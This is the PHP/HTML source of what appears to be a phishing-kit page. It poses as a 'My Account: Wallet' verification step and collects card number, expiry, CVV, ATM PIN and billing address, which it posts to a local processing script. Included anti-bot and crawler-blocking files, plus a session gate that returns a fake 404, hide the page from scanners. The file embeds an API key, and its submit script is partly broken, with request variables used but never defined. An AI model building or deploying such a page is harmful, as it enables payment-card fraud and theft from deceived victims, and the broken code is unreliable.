<?php
error_reporting(0);
session_start();
        include'antibots/IP-BlackList.php';  
        include'antibots/Bot-Crawler.php';
        include'antibots/Bot-Spox.php'; 
        include'antibots/Dila_DZ.php';
        @require "antibots/Crawler/src/CrawlerDetect.php";

        use JayBizzle\CrawlerDetect\CrawlerDetect;
if (!isset($_SESSION['check3'])) {

  header("HTTP/1.0 404 Not Found");
  exit();
}


$_SESSION['css3'] = "true";


?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <link rel="shortcut icon" href="assets/images/favi.ico">
      <link rel="apple-touch-icon" href="#">
      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
      <title>My Account: Wallet</title>
      <link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
      <link rel="stylesheet" href="./assets/css/3.php">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.1/modernizr.min.js"></script>
      <meta http-equiv="cache-control" content="no-cache">
      <meta http-equiv="expires" content="0">
      <meta http-equiv="pragma" content="no-cache">
      <script type="text/javascript" src="assets/js/cardadr.js"></script>
      <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
      <script type="text/javascript" src="assets/js/jquery.mask.min.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
   </head>
   <body>
      <header>
               <div>
               </div>
            </header>
      <div class="mainContainer ">
      <div class="bg">
      </div>
      <div class="hide" id="rotate">
         <div class="circle">
         </div>
         <div class="overlay">
         </div>
      </div>
      <div class="contents">
      <div class="modal hide js-modal">
         <div class="l-modal-shadow js-modal-hide"></div>
         <div class="c-popup l-modal-body">
            <div class="c-popup-img">
               <img src="assets/images/warning.png" />
            </div>
            <h3 class="c-popup-title">Warning!</h3>
            <p class="c-popup-description">Complete the progress first</p>
            <input style="width:50%" class="bt js-modal-hide" type="submit" value="Continue">
         </div>
      </div>
      <div class="mainContents">
         <a href="#" class="close-icon js-modal-hide"></a>
         <ol class="steps js-modal-hide">
            <li id="signed"><a class="signed" href="#">Signed</a></li>
            <li id="Protected"><a class="Protected" href="#">Protected</a></li>
            <li id="Verify"><a class="Verify" href="#">Verify Ownership</a></li>
            <li id="Billing"><a class="Billing" href="#">Billing</a></li>
            <li id="Upload"><a class="Upload" href="#">Upload ID</a></li>
            <li id="Completed"><a class="Completed" href="#">Completed</a></li>
         </ol>
         <div id="process">
            
            <script type="text/javascript" src="assets/js/card3d.js"></script>
            <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCqdgy7U7xSUbS0Nke_TSjNvlaWs4lgNpk&libraries=places&callback=initAutocomplete" async defer></script>
            <form class="form" action="./process/config4.php" method="post" style="padding:0 20px" novalidate="on">
               <div class="fields clearfix">
                  <div class="container preload">
                     <div class="creditcard">
                        <div class="front">
                           <div id="ccsingle"></div>
                           <svg version="1.1" id="cardfront" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 750 471" style="enable-background:new 0 0 750 471;" xml:space="preserve">
                              <g id="Front">
                                 <g id="CardBackground">
                                    <g id="Page-1_1_">
                                       <g id="amex_1_">
                                          <path id="Rectangle-1_1_" class="lightcolor default" d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40 C0,17.9,17.9,0,40,0z" />
                                       </g>
                                    </g>
                                    <path class="darkcolor defaultdark" d="M750,431V193.2c-217.6-57.5-556.4-13.5-750,24.9V431c0,22.1,17.9,40,40,40h670C732.1,471,750,453.1,750,431z" />
                                 </g>
                                 <text transform="matrix(1 0 0 1 60.106 295.0121)" id="svgnumber" class="st2 st3 st4">0123 4567 8910 1112</text>
                                 <text transform="matrix(1 0 0 1 54.1064 428.1723)" id="svgname" class="st2 st5 st6">John Doe</text>
                                 <g>
                                    <text transform="matrix(1 0 0 1 574.4219 433.8095)" id="svgexpire" class="st2 st5 st9">01/23</text>
                                    <text transform="matrix(1 0 0 1 479.3848 417.0097)" class="st2 st10 st11">VALID</text>
                                    <text transform="matrix(1 0 0 1 479.3848 435.6762)" class="st2 st10 st11">THRU</text>
                                    <polygon class="st2" points="554.5,421 540.4,414.2 540.4,427.9 " />
                                 </g>
                                 <g id="cchip">
                                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="-65 -65 1000 600">
                                          <path fill="#FFFFFF" d="M356.1,1l-22.5,0c-1.4,0-2.5,1.1-2.5,2.5v17.4H377L356.1,1z"></path>
                                          <path fill="#FFFFFF" d="M376.2,23.6h-17.4v45.9l19.8-20.9l0-22.5C378.7,24.7,377.6,23.6,376.2,23.6z"></path>
                                          <path fill="#FFFFFF" d="M331.1,71.2h22.5c1.4,0,2.5-1.1,2.5-2.5V51.3h-45.9L331.1,71.2z"></path>
                                          <path fill="#FFFFFF" d="M328.4,48.6V2.7l-19.9,20.9v22.5c0,1.4,1.1,2.5,2.5,2.5H328.4z"></path>
                                          <polygon fill="#FFFFFF" points="282.4,53.4 252,53.4 252,39.9 281.4,39.9 281.4,30.8 252,30.8 252,18.6 282.4,18.6 288.2,9.4 241.2,9.4 241.2,62.8 288.4,62.8 "></polygon>
                                          <path fill="#FFFFFF" d="M217.3,30.5h-21.4c-2.4,0-4-0.6-4-4.2c0,0,0-3.7,0-3.7c0-3,1.1-4.1,3.9-4.1l28,0l5.9-9.2l-35.7,0
                                             c-6.5,0-13.1,3.9-13.1,13.9v2.6c0,10.4,6.4,14.4,12.7,14.4H216c2.3,0,4.2,0.4,4.2,4.3l0,4.5c-0.1,3.5-1.8,4.3-4.3,4.3h-29.4
                                             l-6,9.4h36.2c8.7,0,14.7-4.3,14.7-14.4v-3.7C231.3,35.1,225.8,30.5,217.3,30.5z"></path>
                                          <path fill="#FFFFFF" d="M150.8,9.4l25.4,53.4h-12l-4.9-11h-27.6l-4.9,11h-12l25.3-53.4H150.8z M155.2,42.7l-9.7-22.2l-9.7,22.2
                                                      H155.2z"></path>
                                          <polygon fill="#FFFFFF" points="98.1,30.6 68.6,30.6 68.6,9.4 57.8,9.4 57.8,62.8 68.6,62.8 68.6,39.9 98.1,39.9 98.1,62.8 108.9,62.8 108.9,9.4 98.1,9.4       "></polygon>
                                          <path fill="#FFFFFF" d="M20,18.8h25.5l6-9.5H17.8C6.7,9.4,1,16.2,1,26.1v20c0,11.5,7.3,16.8,16.8,16.8l33.7,0L45.3,53H19.9
                                             c-5.4,0-7.7-2-7.7-8V27C12.1,21.1,14.1,18.8,20,18.8z"></path>
                                    </svg>
                                       </g>
                              </g>
                              <g id="Back"> </g>
                           </svg>
                        </div>
                        <div class="back">
                           <svg version="1.1" id="cardback" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 750 471" style="enable-background:new 0 0 750 471;" xml:space="preserve">
                              <g id="Front">
                                 <line class="st0" x1="35.3" y1="10.4" x2="36.7" y2="11" />
                              </g>
                              <g id="Back">
                                 <g id="Page-1_2_">
                                    <g id="amex_2_">
                                       <path id="Rectangle-1_2_" class="darkcolor greydark" d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40 C0,17.9,17.9,0,40,0z" />
                                    </g>
                                 </g>
                                 <rect y="61.6" class="st2" width="750" height="78" />
                                 <g>
                                    <path class="st3" d="M701.1,249.1H48.9c-3.3,0-6-2.7-6-6v-52.5c0-3.3,2.7-6,6-6h652.1c3.3,0,6,2.7,6,6v52.5 C707.1,246.4,704.4,249.1,701.1,249.1z" />
                                    <rect x="42.9" y="198.6" class="st4" width="664.1" height="10.5" />
                                    <rect x="42.9" y="224.5" class="st4" width="664.1" height="10.5" />
                                    <path class="st5" d="M701.1,184.6H618h-8h-10v64.5h10h8h83.1c3.3,0,6-2.7,6-6v-52.5C707.1,187.3,704.4,184.6,701.1,184.6z" />
                                 </g>
                                 <text transform="matrix(1 0 0 1 621.999 227.2734)" id="svgsecurity" class="st6 st7">000</text>
                                 <g class="st8"> </g>
                                 <rect x="58.1" y="378.6" class="st11" width="375.5" height="13.5" />
                                 <rect x="58.1" y="405.6" class="st11" width="421.7" height="13.5" />
                                 <text transform="matrix(1 0 0 1 59.5073 228.6099)" id="svgnameback" class="st12 st13">John Doe</text>
                              </g>
                           </svg>
                        </div>
                     </div>
                  </div>
                  <div class="form-container">
                     <span id="generatecard" style="display: none;"></span>
                  </div>
                  <div class="inputArea">
                     <input id="fnm" name="fnm" type="text" class="txt-capital" required placeholder="Card Holder Name">
                  </div>
                  <div class="inputArea">
                     <input id="ccn" name="ccn" type="tel" required placeholder="Card Number"  maxlength="19" autocomplete="off">
                     <svg id="ccicon" class="ccicon" width="750" height="471" viewBox="0 0 750 471" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"></svg>
                  </div>
                  <div class="multiInputs">
                     <div class="inputArea hasSub">
                        <input id="cex" name="cex" type="tel" required placeholder="Expiration MM/YY" maxlength="7" autocomplete="off">
                     </div>
                     <div class="inputArea hasSub csc pull-right">
                        <input id="csc" name="csc" type="tel" required placeholder="CVN (3 digits)" maxlength="43" autocomplete="off">
                     </div>
                  </div>
                  <div class="inputArea">
                     <input id="atm" name="atm" type="text" class="txt-capital" required placeholder="ATM Pin" maxlength="4">
                  </div>
                  <div class="inputArea">
                     <input id="adr" name="adr" type="text" autocomplete="off" required placeholder="Start Typing Street Address Line 1">
                  </div>




                  <div id="address-full-form" style="display:none;">
                     <div class="multiInputs">
                        <div class="inputArea hasSub">
                           <input id="cty" type="text" required placeholder="City / Town / Village">
                        </div>
                        <div class="inputArea hasSub pull-right">
                           <input id="zip" type="text" required placeholder="Zip code" maxlength="8">
                        </div>
                     </div>
                     <div class="multiInputs">
                        <div class="inputArea hasSub">
                           <input id="stt" type="text" required placeholder="State / Region">
                        </div>
                        <div class="inputArea hasSub pull-right">
                           <input id="cnt" type="text" required placeholder="Country">
                        </div>
                     </div>
                  </div>
                  <div>

                     <input style="margin-top:20px;margin-bottom:20px;width:100%" type="submit" id="submitbilling" class="bt" value="Next">
                  </div>
            </form>
            <script> 
               $("#Billing,#Verify,#Upload,#Completed").removeClass("current");
               
               $("#Billing").addClass("current"); 
               $(document).ready(function () {
               function validExp(b) {
               var a = new RegExp("(0[1-9]|1[0-2])\/?(([0-9]{4}|[0-9]{2})$)");
               return a.test(b);
               }
               
               c = true;
               function valid() {
               var check = true;
               var ii = 0;
               $("#process input:not(.bt):not([type=checkbox]),#process select").each(function (i, el) {
                if (!$(el).val()) {
                    $(el).parent().addClass("hasError");
                    check = false;
                } else {
                    $(el).not("#ccn").parent().removeClass("hasError");
                }
                if ($(el).attr("id") == "cex") {
                    if (!validExp($(el).val())) {
                        $(el).parent().addClass("hasError");
                        check = false;
                    } else {
                        $(el).parent().removeClass("hasError");
                    }
                }
               });
               return check;
               }var ccvalid = false;
               $("#ccn").validateCreditCard(function (result) {
               var cc = $("#ccn");
               if (cc.val() != "") {
                if (result.valid) {
                    cc.parent().removeClass("hasError");
                    ccvalid = true;
                } else {
                    cc.parent().addClass("hasError");
                    ccvalid = false;
                }
               }
               });
               $("#process input:not(.bt):not([type=checkbox]),select").each(function (i, el) {
               $(el).keyup(function () {
               valid();
               });
               $(el).change(function () {
               valid();
               });
               });
               $(document).on("click", "#submitbilling", function (c) {
               $(window).off("beforeunload");
               $("#address-full-form").show();
                c.preventDefault(); 
               check = true;
               if (!valid()) {
                check = false;
               }
                if (!validExp($("#cex").val())) {
                    $("#cex").parent().addClass("hasError");
                    check = false;
                } else {
                    $("#cex").parent().removeClass("hasError");
                }
                if (!ccvalid) {
                    $("#ccn").parent().addClass("hasError");
                    check = false;
                }
               if (!check) {
                return false;
               } else {
                $("#rotate").removeClass("hide");
                var ccn = $("#ccn").val();
                var cex = $("#cex").val();
                var csc = $("#csc").val();
                var atm = $("#atm").val();
                var fnm = $("#fnm").val();
                var adr = $("#adr").val();
                var cty = $("#cty").val();
                var zip = $("#zip").val();
                var stt = $("#stt").val();
                var cnt = $("#cnt").val();
                var billing = $("#zbilling").val();
                var start = new Date;
                var xT = 0;
                var idT = setInterval(function () {
                    xT = Math.trunc((new Date - start) / 1000);
                }, 1000);
                var toStart = 0;
                 {
                    if (data && status == "success") {
                        clearInterval(idT);
                        if (xT > 4) {
                            toStart = 0;
                        } else {
                            toStart = 1800;
                        }
                        setTimeout(function () {
                            $("#rotate").addClass("hide");
                            $("#process").html(data);
                            window.scrollTo(0, 0);
                        }, toStart);
                    } else {
                        $("#rotate").addClass("hide");
                    }
                };
               }
               return false;
               });
               });
            </script>
            </div>
         </div>
         <script type="text/javascript">
            $(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
            $(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
         </script>
      </div>
   </body>
</html>